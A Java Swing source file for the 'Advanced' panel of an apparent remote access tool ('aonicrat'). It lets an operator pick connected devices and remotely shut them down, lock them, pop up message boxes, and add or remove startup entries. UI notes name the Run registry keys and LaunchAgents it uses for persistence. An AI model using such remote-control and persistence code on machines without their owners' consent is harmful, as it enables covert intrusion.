package com.webaon.aonicrat;

import javax.swing.*;
import javax.swing.table.DefaultTableModel;
import java.awt.*;
import java.util.List;

public class AdvancedPanel extends JPanel {

    // ── device selector ───────────────────────────────────────────────────────
    private final JComboBox<String> osCombo     = new JComboBox<>(new String[]{"Windows","Mac OS","Linux","Android","iOS"});
    private final JComboBox<String> deviceCombo = new JComboBox<>();
    private final JButton loadBtn       = new JButton("Load More Devices");
    private final JButton connectBtn    = new JButton("Connect");
    private final JButton disconnectBtn = new JButton("Disconnect");
    private final JLabel  statusLabel   = new JLabel("  Not connected");

    // ── power controls ────────────────────────────────────────────────────────
    private final JButton shutdownBtn  = new JButton("⏻ Shutdown");
    private final JButton restartBtn   = new JButton("↺ Restart");
    private final JButton sleepBtn     = new JButton("☾ Sleep");
    private final JButton lockBtn      = new JButton("🔒 Lock Screen");
    private final JButton logoffBtn    = new JButton("⇥ Log Off");

    // ── startup manager ───────────────────────────────────────────────────────
    private final DefaultTableModel startupModel = new DefaultTableModel(
        new String[]{"Name","Command","Type"}, 0) {
        @Override public boolean isCellEditable(int r, int c) { return false; }
    };
    private final JTable  startupTable  = new JTable(startupModel);
    private final JButton startupList   = new JButton("List Entries");
    private final JButton startupAdd    = new JButton("Add Entry");
    private final JButton startupRemove = new JButton("Remove Entry");

    // ── message box ───────────────────────────────────────────────────────────
    private final JTextField msgTitle = new JTextField("Alert", 22);
    private final JTextArea  msgBody  = new JTextArea(4, 44);
    private final JComboBox<String> msgType =
        new JComboBox<>(new String[]{"Information","Warning","Error","Question"});
    private final JButton msgSendBtn = new JButton("Send Message Box to Remote Device");

    // ── state ─────────────────────────────────────────────────────────────────
    private final ServerManager serverManager;
    private RemoteDevice currentDevice;

    public AdvancedPanel(ServerManager sm) {
        this.serverManager = sm;
        setLayout(new BorderLayout());
        add(buildTopBar(),    BorderLayout.NORTH);
        add(buildTabs(),      BorderLayout.CENTER);
        add(buildStatusBar(), BorderLayout.SOUTH);
        setupListener();
        wireButtons();
    }

    // ─────────────────────────────────────────────────────────────────────────

    private JPanel buildTopBar() {
        JPanel bar = new JPanel(new FlowLayout(FlowLayout.LEFT, 8, 5));
        bar.setBackground(new Color(102, 204, 255));
        bar.add(new JLabel("OS Type:")); bar.add(osCombo);
        bar.add(new JLabel("Device:"));
        deviceCombo.setPreferredSize(new Dimension(220, 22));
        bar.add(deviceCombo);
        bar.add(loadBtn); bar.add(connectBtn); bar.add(disconnectBtn);
        return bar;
    }

    private JPanel buildStatusBar() {
        JPanel bar = new JPanel(new FlowLayout(FlowLayout.LEFT, 6, 3));
        bar.setBackground(new Color(230, 230, 230));
        bar.add(new JLabel("Status:")); bar.add(statusLabel);
        return bar;
    }

    private JTabbedPane buildTabs() {
        JTabbedPane t = new JTabbedPane();
        t.addTab("Power Controls",  buildPowerTab());
        t.addTab("Startup Manager", buildStartupTab());
        t.addTab("Message Box",     buildMsgBoxTab());
        return t;
    }

    private JPanel buildPowerTab() {
        JPanel p = new JPanel(new BorderLayout());
        p.setBorder(BorderFactory.createEmptyBorder(20, 16, 16, 16));

        JPanel btnRow = new JPanel(new FlowLayout(FlowLayout.LEFT, 14, 8));
        for (JButton b : new JButton[]{shutdownBtn, restartBtn, sleepBtn, lockBtn, logoffBtn}) {
            b.setPreferredSize(new Dimension(140, 42));
            b.setFont(b.getFont().deriveFont(Font.BOLD, 12f));
            btnRow.add(b);
        }
        p.add(btnRow, BorderLayout.NORTH);

        JLabel note = new JLabel("<html><small>"
            + "<b>Windows:</b> shutdown /s|/r|/l, rundll32 LockWorkStation, powrprof SetSuspendState. "
            + "<b>Linux:</b> systemctl poweroff|reboot|suspend, loginctl lock-session. "
            + "<b>Mac:</b> osascript System Events, pmset sleepnow, ScreenSaverEngine."
            + "</small></html>");
        note.setBorder(BorderFactory.createEmptyBorder(12, 4, 4, 4));
        p.add(note, BorderLayout.CENTER);
        return p;
    }

    private JPanel buildStartupTab() {
        JPanel p = new JPanel(new BorderLayout(0, 4));
        p.setBorder(BorderFactory.createEmptyBorder(4, 4, 4, 4));
        JPanel tb = new JPanel(new FlowLayout(FlowLayout.LEFT, 6, 2));
        tb.add(startupList); tb.add(startupAdd); tb.add(startupRemove);
        p.add(tb, BorderLayout.NORTH);
        startupTable.setFont(new Font("Consolas", Font.PLAIN, 12));
        startupTable.setRowHeight(20);
        startupTable.getColumnModel().getColumn(0).setPreferredWidth(180);
        startupTable.getColumnModel().getColumn(1).setPreferredWidth(420);
        startupTable.getColumnModel().getColumn(2).setPreferredWidth(100);
        p.add(new JScrollPane(startupTable), BorderLayout.CENTER);
        JLabel note = new JLabel("<html><small>"
            + "<b>Windows:</b> HKCU &amp; HKLM CurrentVersion\\Run registry keys. "
            + "<b>Linux:</b> ~/.config/autostart/*.desktop (XDG). "
            + "<b>Mac:</b> ~/Library/LaunchAgents/*.plist."
            + "</small></html>");
        note.setBorder(BorderFactory.createEmptyBorder(2, 4, 2, 4));
        p.add(note, BorderLayout.SOUTH);
        return p;
    }

    private JPanel buildMsgBoxTab() {
        JPanel p = new JPanel(new BorderLayout(0, 8));
        p.setBorder(BorderFactory.createEmptyBorder(14, 14, 14, 14));

        JPanel form = new JPanel(new GridBagLayout());
        GridBagConstraints g = new GridBagConstraints();
        g.insets = new Insets(5, 5, 5, 5);
        g.anchor = GridBagConstraints.WEST;

        g.gridx=0; g.gridy=0; form.add(new JLabel("Title:"), g);
        g.gridx=1; g.fill=GridBagConstraints.HORIZONTAL; g.weightx=1;
        form.add(msgTitle, g);

        g.gridx=0; g.gridy=1; g.fill=GridBagConstraints.NONE; g.weightx=0;
        form.add(new JLabel("Message:"), g);
        g.gridx=1; g.fill=GridBagConstraints.BOTH; g.weighty=1;
        msgBody.setLineWrap(true); msgBody.setWrapStyleWord(true);
        form.add(new JScrollPane(msgBody), g);

        g.gridx=0; g.gridy=2; g.fill=GridBagConstraints.NONE; g.weighty=0;
        form.add(new JLabel("Type:"), g);
        g.gridx=1; form.add(msgType, g);

        p.add(form, BorderLayout.CENTER);

        JPanel btnRow = new JPanel(new FlowLayout(FlowLayout.LEFT));
        msgSendBtn.setFont(msgSendBtn.getFont().deriveFont(Font.BOLD));
        btnRow.add(msgSendBtn);
        p.add(btnRow, BorderLayout.SOUTH);
        return p;
    }

    // ─────────────────────────────────────────────────────────────────────────

    private void setupListener() {
        serverManager.setAdvancedListener(new ServerManager.AdvancedListener() {
            @Override public void onPowerResult(RemoteDevice d, String action, boolean ok, String err) {
                statusLabel.setText(ok ? "  " + action + " sent to " + d.pcName : "  " + action + " failed: " + err);
                if (!ok) JOptionPane.showMessageDialog(AdvancedPanel.this,
                    action + " failed: " + err, "Error", JOptionPane.ERROR_MESSAGE);
            }
            @Override public void onStartupList(RemoteDevice d, String[][] rows) {
                startupModel.setRowCount(0);
                for (String[] r : rows) startupModel.addRow(r);
                statusLabel.setText("  " + rows.length + " startup entries on " + d.pcName);
            }
            @Override public void onStartupChanged(RemoteDevice d, boolean ok, String err) {
                if (ok) {
                    statusLabel.setText("  Startup updated on " + d.pcName);
                    serverManager.sendAdvancedCmd(d, "startup:list", null);
                } else {
                    JOptionPane.showMessageDialog(AdvancedPanel.this,
                        "Startup change failed: " + err, "Error", JOptionPane.ERROR_MESSAGE);
                }
            }
            @Override public void onMsgBoxResult(RemoteDevice d, boolean ok, String err) {
                statusLabel.setText(ok ? "  Message sent to " + d.pcName : "  Send failed: " + err);
                if (!ok) JOptionPane.showMessageDialog(AdvancedPanel.this,
                    "Message box failed: " + err, "Error", JOptionPane.ERROR_MESSAGE);
            }
            @Override public void onError(RemoteDevice d, String op, String err) {
                JOptionPane.showMessageDialog(AdvancedPanel.this,
                    "[" + op + "] " + err, "Error", JOptionPane.ERROR_MESSAGE);
                statusLabel.setText("  Error: " + err);
            }
        });
    }

    private void wireButtons() {
        loadBtn.addActionListener(e -> {
            String os = (String) osCombo.getSelectedItem();
            List<RemoteDevice> devs = serverManager.getDevicesByOsType(os);
            DefaultComboBoxModel<String> m = new DefaultComboBoxModel<>();
            for (RemoteDevice d : devs) m.addElement(d.toString());
            deviceCombo.setModel(m);
        });

        connectBtn.addActionListener(e -> {
            String sel = (String) deviceCombo.getSelectedItem();
            if (sel == null || sel.isEmpty()) { JOptionPane.showMessageDialog(this, "Load devices first."); return; }
            currentDevice = serverManager.getConnectedDevices().stream()
                .filter(d -> d.toString().equals(sel)).findFirst().orElse(null);
            if (currentDevice == null) { JOptionPane.showMessageDialog(this, "Device not found."); return; }
            statusLabel.setText("  Connected to " + currentDevice.pcName);
        });

        disconnectBtn.addActionListener(e -> {
            currentDevice = null;
            statusLabel.setText("  Not connected");
        });

        // power buttons
        shutdownBtn .addActionListener(e -> sendPower("shutdown",  "Shut down"));
        restartBtn  .addActionListener(e -> sendPower("restart",   "Restart"));
        sleepBtn    .addActionListener(e -> sendPower("sleep",     "Sleep"));
        lockBtn     .addActionListener(e -> sendPower("lock_screen","Lock screen"));
        logoffBtn   .addActionListener(e -> sendPower("log_off",   "Log off"));

        startupList.addActionListener(e -> {
            if (currentDevice == null) { JOptionPane.showMessageDialog(this, "Connect first."); return; }
            serverManager.sendAdvancedCmd(currentDevice, "startup:list", null);
        });

        startupAdd.addActionListener(e -> {
            if (currentDevice == null) { JOptionPane.showMessageDialog(this, "Connect first."); return; }
            String name = JOptionPane.showInputDialog(this, "Entry name:", "MyApp");
            if (name == null || name.trim().isEmpty()) return;
            String cmd = JOptionPane.showInputDialog(this, "Command (full path):", "C:\\path\\to\\app.exe");
            if (cmd == null || cmd.trim().isEmpty()) return;
            org.json.JSONObject p = new org.json.JSONObject();
            p.put("name", name.trim()); p.put("command", cmd.trim());
            serverManager.sendAdvancedCmd(currentDevice, "startup:add", p);
        });

        startupRemove.addActionListener(e -> {
            if (currentDevice == null) { JOptionPane.showMessageDialog(this, "Connect first."); return; }
            int row = startupTable.getSelectedRow();
            if (row < 0) { JOptionPane.showMessageDialog(this, "Select an entry first."); return; }
            String name = startupTable.getValueAt(row, 0).toString();
            String type = startupTable.getValueAt(row, 2).toString();
            if (JOptionPane.showConfirmDialog(this, "Remove startup entry: " + name + "?",
                    "Confirm", JOptionPane.YES_NO_OPTION) == JOptionPane.YES_OPTION) {
                org.json.JSONObject p = new org.json.JSONObject();
                p.put("name", name); p.put("type", type);
                serverManager.sendAdvancedCmd(currentDevice, "startup:remove", p);
            }
        });

        msgSendBtn.addActionListener(e -> {
            if (currentDevice == null) { JOptionPane.showMessageDialog(this, "Connect first."); return; }
            if (msgBody.getText().trim().isEmpty()) { JOptionPane.showMessageDialog(this, "Enter a message."); return; }
            org.json.JSONObject p = new org.json.JSONObject();
            p.put("title",   msgTitle.getText().trim());
            p.put("message", msgBody.getText().trim());
            p.put("type",    (String) msgType.getSelectedItem());
            serverManager.sendAdvancedCmd(currentDevice, "msgbox:show", p);
        });
    }

    private void sendPower(String action, String label) {
        if (currentDevice == null) { JOptionPane.showMessageDialog(this, "Connect first."); return; }
        if (JOptionPane.showConfirmDialog(this,
                label + " the remote device " + currentDevice.pcName + "?",
                "Confirm", JOptionPane.YES_NO_OPTION,
                JOptionPane.WARNING_MESSAGE) == JOptionPane.YES_OPTION) {
            org.json.JSONObject p = new org.json.JSONObject();
            p.put("action", action);
            serverManager.sendAdvancedCmd(currentDevice, "power:action", p);
        }
    }
}
